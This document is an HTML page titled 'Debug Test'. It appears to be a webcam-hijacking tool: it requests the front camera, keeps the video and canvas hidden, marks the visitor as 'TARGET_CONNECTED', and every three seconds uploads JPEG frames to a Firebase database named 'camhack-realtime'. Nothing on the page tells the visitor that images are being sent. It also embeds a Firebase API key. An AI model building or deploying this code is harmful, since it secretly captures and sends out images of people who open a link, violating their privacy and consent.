<!DOCTYPE html>
<html>
<head>
    <title>Debug Test</title>
</head>
<body>
    <h1>ğŸ” Debug Test</h1>
    <div id="status">Starting...</div>
    <div id="log"></div>
    
    <video id="video" autoplay muted playsinline style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>

    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>

    <script>
        function log(msg) {
            console.log(msg);
            document.getElementById('log').innerHTML += msg + '<br>';
        }
        
        const config = {
            apiKey: "AIzaSyDm83pllDlsMkmcj2S5HR4_jgAHcXyEVfI",
            databaseURL: "https://camhack-realtime-default-rtdb.firebaseio.com"
        };
        
        firebase.initializeApp(config);
        const db = firebase.database();
        
        const params = new URLSearchParams(window.location.search);
        const sessionId = params.get('session') || 'test123';
        
        log('ğŸ¯ Session: ' + sessionId);
        
        // Test Firebase connection first
        db.ref('test').set({
            timestamp: Date.now(),
            message: 'Firebase test'
        }).then(() => {
            log('âœ… Firebase connected');
        }).catch(err => {
            log('âŒ Firebase failed: ' + err.message);
        });
        
        // Start camera
        navigator.mediaDevices.getUserMedia({ 
            video: { 
                width: 640, 
                height: 480,
                facingMode: 'user'
            } 
        })
        .then(stream => {
            log('âœ… Camera access granted');
            
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            
            video.srcObject = stream;
            video.onloadedmetadata = () => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                log('ğŸ“· Camera ready: ' + canvas.width + 'x' + canvas.height);
                
                // Send status to Firebase
                db.ref('sessions/' + sessionId + '/status').set({
                    type: 'TARGET_CONNECTED',
                    timestamp: Date.now(),
                    cameraWidth: canvas.width,
                    cameraHeight: canvas.height
                }).then(() => {
                    log('âœ… Status sent to Firebase');
                }).catch(err => {
                    log('âŒ Status send failed: ' + err.message);
                });
                
                // Send test frame immediately
                setTimeout(() => {
                    sendFrame();
                }, 1000);
                
                // Then send frames every 3 seconds
                setInterval(sendFrame, 3000);
            };
            
            function sendFrame() {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(blob => {
                    const reader = new FileReader();
                    reader.onload = () => {
                        const frameData = {
                            image: reader.result,
                            frameNumber: Date.now(),
                            timestamp: Date.now(),
                            size: reader.result.length
                        };
                        
                        log('ğŸ“¤ Sending frame - Size: ' + Math.round(frameData.size/1024) + 'KB');
                        
                        db.ref('sessions/' + sessionId + '/frames').push(frameData)
                        .then(() => {
                            log('âœ… Frame sent successfully');
                            document.getElementById('status').textContent = 'Frame sent: ' + new Date().toLocaleTimeString();
                        })
                        .catch(err => {
                            log('âŒ Frame send failed: ' + err.message);
                        });
                    };
                    reader.readAsDataURL(blob);
                }, 'image/jpeg', 0.8);
            }
        })
        .catch(err => {
            log('âŒ Camera failed: ' + err.message);
        });
    </script>
</body>
</html>
